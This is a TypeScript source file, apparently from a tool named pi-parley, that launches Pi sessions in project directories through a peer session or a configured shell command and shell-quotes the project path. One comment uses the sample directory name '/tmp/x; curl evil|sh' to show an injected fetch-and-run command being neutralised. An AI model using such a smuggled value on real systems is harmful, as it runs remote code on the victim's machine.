import { spawn, type ChildProcess } from "child_process";
import { realpathSync, statSync } from "fs";
import { resolve } from "path";
import { sameCwd } from "./cwd.ts";
import type { SessionInfo } from "./types.ts";

const DEFAULT_PROJECT_AGENT_TIMEOUT_MS = 20_000;
const DEFAULT_PROJECT_AGENT_POLL_MS = 250;
/**
 * Observe immediate command failures without managing the launcher's lifetime.
 * Surviving this window is not proof that a terminal or Pi session was created.
 */
const LAUNCH_COMMAND_FAILURE_WINDOW_MS = 1_000;
const LAUNCH_COMMAND_MAX_LENGTH = 1024;

/**
 * Generic project-launch integration.
 *
 * pi-parley never depends on a specific terminal manager. Any live
 * parley session -- Herdr, FlightDeck, a tmux helper, or anything else --
 * registers as a project-launch provider by advertising this extension
 * capability namespace, then answers launch requests delivered as ordinary
 * parley messages. Machines without a live provider can configure a
 * default launch command (PI_PARLEY_PROJECT_LAUNCHER or config
 * "projectLauncher"); there is no built-in default.
 */
export const PROJECT_LAUNCH_NAMESPACE = "pi-parley/project-launch-v1";

export const PROJECT_LAUNCH_REQUEST_TYPE = "pi-parley/project-launch-request";

export interface ProjectLaunchRequest {
  type: typeof PROJECT_LAUNCH_REQUEST_TYPE;
  /** Absolute project root the terminal should open in. */
  root: string;
  /** Command to run inside the terminal (normally "pi"). */
  command: string;
  /** Whether the new terminal should receive focus when supported. */
  focus: boolean;
}

/** Receipt for the launch attempt, not proof that a terminal or session exists. */
export interface ProjectPaneLaunch {
  projectRoot: string;
  provider:
    | { kind: "session"; sessionId: string; name: string }
    | { kind: "command"; command: string };
  /**
   * Request acceptance means transport acceptance, not provider execution.
   * Command startup means no immediate failure was observed. An unknown outcome
   * can already have created resources; repeating the launch can duplicate them.
   */
  outcome: "request-accepted" | "command-started" | "not-started" | "unknown";
  requestMessageId?: string;
}

/**
 * Failure context survives each boundary: requesting a launch, observing a new
 * registration, and contacting that session. Callers can attach the same receipt
 * and session to a delivery error without re-running the launch. This is a
 * snapshot of observations, not a retry policy or a managed session lifecycle.
 */
export class ProjectLaunchError extends Error {
  readonly stage: "launch" | "registration" | "delivery";
  readonly launch?: ProjectPaneLaunch;
  readonly session?: SessionInfo;

  constructor(message: string, context: {
    stage: "launch" | "registration" | "delivery";
    launch?: ProjectPaneLaunch;
    session?: SessionInfo;
    cause?: unknown;
  }) {
    super(message, { cause: context.cause });
    this.name = "ProjectLaunchError";
    this.stage = context.stage;
    this.launch = context.launch;
    this.session = context.session;
  }
}

class LaunchCommandError extends Error {
  constructor(message: string, readonly outcome: "not-started" | "unknown") {
    super(message);
  }
}

export interface ProjectTargetResolution {
  kind: "found" | "missing";
  session?: SessionInfo;
  targetCwd: string;
  reason?: string;
}

export interface ListSessionsClient {
  listSessions(options?: { timeoutMs?: number }): Promise<SessionInfo[]>;
}

export type LaunchCommandSpawn = (commandLine: string, options: {
  shell: true;
  windowsHide: true;
  cwd: string;
  env: NodeJS.ProcessEnv;
  detached: boolean;
}) => ChildProcess;

/**
 * Encodes the provider request contract. Providers parse incoming messages
 * with {@link parseProjectLaunchRequest} and act on them; anything that is
 * not a valid request is left alone as an ordinary message.
 */
export function projectLaunchRequestText(request: ProjectLaunchRequest): string {
  return JSON.stringify(request);
}

export function parseProjectLaunchRequest(text: string): ProjectLaunchRequest | undefined {
  try {
    const parsed: unknown = JSON.parse(text);
    if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) return undefined;
    const record = parsed as Record<string, unknown>;
    if (record.type !== PROJECT_LAUNCH_REQUEST_TYPE) return undefined;
    if (typeof record.root !== "string" || !record.root.trim()) return undefined;
    if (typeof record.command !== "string" || !record.command.trim()) return undefined;
    if (typeof record.focus !== "boolean") return undefined;
    return {
      type: PROJECT_LAUNCH_REQUEST_TYPE,
      root: record.root,
      command: record.command,
      focus: record.focus,
    };
  } catch {
    return undefined;
  }
}

/**
 * Picks the project-launch provider deterministically: the longest-running
 * visible session advertising the namespace, tie-broken by session id. The
 * requester's own session never provides its own launch.
 */
export function findProjectLaunchProvider(sessions: readonly SessionInfo[], currentSessionId: string): SessionInfo | undefined {
  return sessions
    .filter((candidate) => candidate.id !== currentSessionId
      // Federation v1 does not carry capabilities across links; a remote row
      // must never be picked as a local project-launch provider.
      && candidate.federation === undefined
      && candidate.extensions?.some((extension) => extension.namespace === PROJECT_LAUNCH_NAMESPACE))
    .sort((left, right) => (left.startedAt ?? 0) - (right.startedAt ?? 0) || left.id.localeCompare(right.id))[0];
}

export function resolveProjectLauncherCommand(
  env: NodeJS.ProcessEnv = process.env,
  configured?: string,
): string | undefined {
  const fromEnv = env.PI_PARLEY_PROJECT_LAUNCHER?.trim();
  if (fromEnv) return fromEnv;
  const fromConfig = configured?.trim();
  return fromConfig ? fromConfig : undefined;
}

function shellQuotePath(value: string): string {
  if (process.platform === "win32") return `"${value.replaceAll('"', '\\"')}"`;
  return `'${value.replaceAll("'", "'\\''")}'`;
}

/**
 * Runs the configured default launch command. `{root}` is substituted with a
 * safely shell-quoted project root — write it bare (pi-parley adds the
 * quoting), so a hostile directory name like "/tmp/x; curl evil|sh" can never
 * break out of the argument. The unquoted root is exported as
 * PI_PARLEY_PROJECT_ROOT for commands that need it verbatim. The command
 * runs in the project root, detached, and pi-parley does not manage or wait
 * for the terminal it creates.
 */
export async function launchProjectCommand(
  command: string,
  root: string,
  options: { signal?: AbortSignal; spawnImpl?: LaunchCommandSpawn; failureWindowMs?: number } = {},
): Promise<void> {
  if (options.signal?.aborted) throw new LaunchCommandError("Project launcher command was cancelled before startup.", "not-started");
  if (!command.trim()) throw new LaunchCommandError("Project launcher command must not be empty.", "not-started");
  if (command.length > LAUNCH_COMMAND_MAX_LENGTH) {
    throw new LaunchCommandError(`Project launcher command must be at most ${LAUNCH_COMMAND_MAX_LENGTH} characters.`, "not-started");
  }
  const commandLine = command.replaceAll("{root}", shellQuotePath(root));
  const spawnImpl = options.spawnImpl ?? spawn;
  await new Promise<void>((resolveLaunch, rejectLaunch) => {
    let child: ChildProcess;
    let settled = false;
    const windowMs = options.failureWindowMs ?? LAUNCH_COMMAND_FAILURE_WINDOW_MS;
    try {
      child = spawnImpl(commandLine, {
        shell: true,
        windowsHide: true,
        cwd: root,
        env: {
          ...process.env,
          PI_PARLEY_PROJECT_ROOT: root,
        },
        detached: true,
      });
    } catch (cause) {
      rejectLaunch(new LaunchCommandError(`Failed to start the project launcher: ${errorText(cause)}`, "not-started"));
      return;
    }
    const finish = (error?: Error): void => {
      if (settled) return;
      settled = true;
      clearTimeout(window);
      options.signal?.removeEventListener("abort", onAbort);
      error ? rejectLaunch(error) : resolveLaunch();
    };
    const onAbort = () => {
      try { child.kill(); } catch { /* already gone */ }
      finish(new LaunchCommandError("Project launcher command was aborted after startup was attempted.", "unknown"));
    };
    const window = setTimeout(() => finish(), windowMs);
    window.unref?.();
    let spawned = false;
    child.on("spawn", () => { spawned = true; });
    child.on("error", (cause) => finish(new LaunchCommandError(
      `Project launcher command failed: ${cause.message}`,
      spawned || child.pid !== undefined ? "unknown" : "not-started",
    )));
    // Even a non-zero exit can follow terminal creation. It is a command
    // failure, not evidence that nothing was launched.
    child.on("close", (exitCode, signal) => {
      if (exitCode !== 0) {
        finish(new LaunchCommandError(
          signal ? `Project launcher command ended on signal ${signal}.` : `Project launcher command exited with code ${exitCode}.`,
          "unknown",
        ));
        return;
      }
      finish();
    });
    if (options.signal?.aborted) {
      onAbort();
      return;
    }
    options.signal?.addEventListener("abort", onAbort, { once: true });
  });
}

export function resolveTargetInCwd(input: {
  sessions: SessionInfo[];
  currentSessionId: string;
  targetCwd: string;
  to?: string;
}): ProjectTargetResolution {
  // cwd addresses a local filesystem, not a similarly spelled remote path.
  const inCwd = input.sessions.filter((session) => session.federation === undefined && sameCwd(session.cwd, input.targetCwd));
  const target = input.to?.trim();

  if (!target) {
    const candidates = inCwd.filter((session) => session.id !== input.currentSessionId);
    if (candidates.length === 1) {
      return { kind: "found", session: candidates[0], targetCwd: input.targetCwd };
    }
    if (candidates.length === 0) {
      return { kind: "missing", targetCwd: input.targetCwd, reason: `No other local parley sessions are visible in ${input.targetCwd}.` };
    }
    throw new Error(`Multiple parley sessions are connected in ${input.targetCwd}: ${formatSessionRefs(candidates)}. Specify 'to'.`);
  }

  const byId = inCwd.find((session) => session.id === target);
  if (byId) return { kind: "found", session: byId, targetCwd: input.targetCwd };

  const lowerName = target.toLowerCase();
  const byName = inCwd.filter((session) => session.name?.toLowerCase() === lowerName);
  if (byName.length === 1) return { kind: "found", session: byName[0], targetCwd: input.targetCwd };
  if (byName.length > 1) {
    throw new Error(`Multiple parley sessions named "${target}" are connected in ${input.targetCwd}: ${formatSessionRefs(byName)}. Address one by session ID.`);
  }

  const byIdPrefix = inCwd.filter((session) => session.id.startsWith(target));
  if (byIdPrefix.length === 1) return { kind: "found", session: byIdPrefix[0], targetCwd: input.targetCwd };
  if (byIdPrefix.length > 1) {
    throw new Error(`Multiple parley sessions in ${input.targetCwd} match ID prefix "${target}". Use a longer session ID prefix.`);
  }

  return { kind: "missing", targetCwd: input.targetCwd, reason: `No local parley session matching "${target}" is visible in ${input.targetCwd}.` };
}

/**
 * Launches a Pi session in a project through whatever generic provider is
 * available: first a live mesh session advertising the project-launch
 * namespace, then a configured default launch command. Success reports only
 * request acceptance or command startup. Registration is a separate observation
 * through waitForProjectSession; neither observation proves terminal creation.
 */
export async function openProjectPane(input: {
  cwd: string;
  focus?: boolean;
  sessions: readonly SessionInfo[];
  currentSessionId: string;
  launcherCommand?: string;
  sendRequest: (provider: SessionInfo, request: ProjectLaunchRequest) => Promise<{
    delivered: boolean;
    reason?: string;
    id?: string;
    /** A negative receipt only proves no acceptance when its outcome is known. */
    outcomeKnown?: boolean;
  }>;
  signal?: AbortSignal;
  spawnImpl?: LaunchCommandSpawn;
}): Promise<ProjectPaneLaunch> {
  if (input.signal?.aborted) {
    throw new ProjectLaunchError("Project launch was cancelled before it was requested.", { stage: "launch" });
  }
  let projectRoot: string;
  try {
    projectRoot = resolveProjectRoot(input.cwd);
  } catch (cause) {
    throw new ProjectLaunchError(errorText(cause), { stage: "launch", cause });
  }
  const command = process.env.PI_PARLEY_PI_BIN?.trim() || process.env.PI_BIN?.trim() || "pi";
  const provider = findProjectLaunchProvider(input.sessions, input.currentSessionId);
  if (provider) {
    const launch: ProjectPaneLaunch = {
      projectRoot,
      provider: { kind: "session", sessionId: provider.id, name: provider.name ?? provider.id },
      outcome: "unknown",
    };
    const request: ProjectLaunchRequest = {
      type: PROJECT_LAUNCH_REQUEST_TYPE,
      root: projectRoot,
      command,
      focus: input.focus !== false,
    };
    let sent: Awaited<ReturnType<typeof input.sendRequest>>;
    try {
      sent = await input.sendRequest(provider, request);
    } catch (cause) {
      throw new ProjectLaunchError(
        `The launch request to ${provider.name ?? provider.id} has an unknown outcome: ${errorText(cause)} The provider may already have acted; another launch could create a duplicate.`,
        { stage: "launch", launch, cause },
      );
    }
    const receipt: ProjectPaneLaunch = {
      ...launch,
      outcome: sent.delivered ? "request-accepted" : sent.outcomeKnown === true ? "not-started" : "unknown",
      ...(sent.id ? { requestMessageId: sent.id } : {}),
    };
    if (!sent.delivered) {
      throw new ProjectLaunchError(
        `The launch request to ${provider.name ?? provider.id} was not confirmed accepted: ${sent.reason ?? "no delivery confirmation."}`
        + (receipt.outcome === "unknown" ? " The provider may already have acted; another launch could create a duplicate." : " No launch request was accepted."),
        { stage: "launch", launch: receipt },
      );
    }
    return receipt;
  }
  if (input.launcherCommand) {
    const launch: ProjectPaneLaunch = {
      projectRoot,
      provider: { kind: "command", command: input.launcherCommand },
      outcome: "unknown",
    };
    try {
      await launchProjectCommand(input.launcherCommand, projectRoot, { signal: input.signal, spawnImpl: input.spawnImpl });
    } catch (cause) {
      const outcome = cause instanceof LaunchCommandError ? cause.outcome : "unknown";
      throw new ProjectLaunchError(
        errorText(cause) + (outcome === "unknown" ? " The command may already have created resources; another launch could create a duplicate." : " No launcher command was started."),
        { stage: "launch", launch: { ...launch, outcome }, cause },
      );
    }
    return { ...launch, outcome: "command-started" };
  }
  throw new ProjectLaunchError(
    "No project launcher is available. No launch was attempted. Local project launch is supported through a visible session advertising "
    + `the "${PROJECT_LAUNCH_NAMESPACE}" capability or a configured PI_PARLEY_PROJECT_LAUNCHER (config "projectLauncher"). `
    + "Neither is available in this session; parley does not supply a terminal manager.",
    { stage: "launch" },
  );
}

/**
 * Observes a sole new, visible local session in the project. The v1 launcher
 * contract does not assign a peer name or carry registration correlation, so
 * an earlier `to` selector is not a constraint on this observation. A roster
 * match is not proof that this particular launch created the session. Multiple
 * candidates remain ambiguous rather than selecting one arbitrarily.
 *
 * Passing the launch receipt preserves it on timeout, cancellation, or roster
 * failure. Ending this wait never cancels a launch or removes created resources.
 */
export async function waitForProjectSession(client: ListSessionsClient, input: {
  projectRoot: string;
  currentSessionId: string;
  beforeSessionIds: ReadonlySet<string>;
  launch?: ProjectPaneLaunch;
  signal?: AbortSignal;
  timeoutMs?: number;
  pollMs?: number;
}): Promise<SessionInfo> {
  const deadline = Date.now() + (input.timeoutMs ?? DEFAULT_PROJECT_AGENT_TIMEOUT_MS);
  const pollMs = input.pollMs ?? DEFAULT_PROJECT_AGENT_POLL_MS;

  try {
    while (Date.now() < deadline) {
      if (input.signal?.aborted) throw new Error("Cancelled while waiting for project registration.");
      const sessions = await client.listSessions({ timeoutMs: Math.min(5_000, deadline - Date.now()) });
      if (input.signal?.aborted) throw new Error("Cancelled while waiting for project registration.");
      if (Date.now() >= deadline) break;

      const newInProject = sessions.filter(
        (session) => session.federation === undefined
          && session.id !== input.currentSessionId
          && !input.beforeSessionIds.has(session.id)
          && sameCwd(session.cwd, input.projectRoot),
      );
      if (newInProject.length === 1) return newInProject[0]!;
      if (newInProject.length > 1) {
        throw new Error(`Multiple new local parley sessions are visible in ${input.projectRoot}: ${formatSessionRefs(newInProject)}. Their relationship to the launch is unknown.`);
      }

      await sleep(Math.min(pollMs, Math.max(0, deadline - Date.now())), input.signal);
    }

    throw new Error(`Timed out waiting for a local Pi parley session to register in ${input.projectRoot}. The project launcher may still be starting, or parley may not be loaded there.`);
  } catch (cause) {
    throw new ProjectLaunchError(
      errorText(cause) + (input.launch ? " The launch attempt has not been undone; another launch could create a duplicate." : ""),
      { stage: "registration", launch: input.launch, cause },
    );
  }
}

function resolveProjectRoot(cwd: string): string {
  const resolved = resolve(cwd);
  const stat = statSync(resolved);
  if (!stat.isDirectory()) {
    throw new Error(`Project target '${resolved}' is not a directory.`);
  }
  return realpathSync(resolved);
}

function errorText(error: unknown): string {
  return error instanceof Error ? error.message : String(error);
}

function formatSessionRefs(sessions: SessionInfo[]): string {
  return sessions
    .map((session) => `${session.name || "Unnamed session"} (${session.id.slice(0, 8)})`)
    .join(", ");
}

function sleep(ms: number, signal?: AbortSignal): Promise<void> {
  return new Promise((resolveSleep, reject) => {
    if (signal?.aborted) {
      reject(new Error("Cancelled"));
      return;
    }
    let timer: NodeJS.Timeout;
    const cleanup = () => signal?.removeEventListener("abort", onAbort);
    const onAbort = () => {
      clearTimeout(timer);
      cleanup();
      reject(new Error("Cancelled"));
    };
    timer = setTimeout(() => {
      cleanup();
      resolveSleep();
    }, ms);
    timer.unref?.();
    signal?.addEventListener("abort", onAbort, { once: true });
  });
}
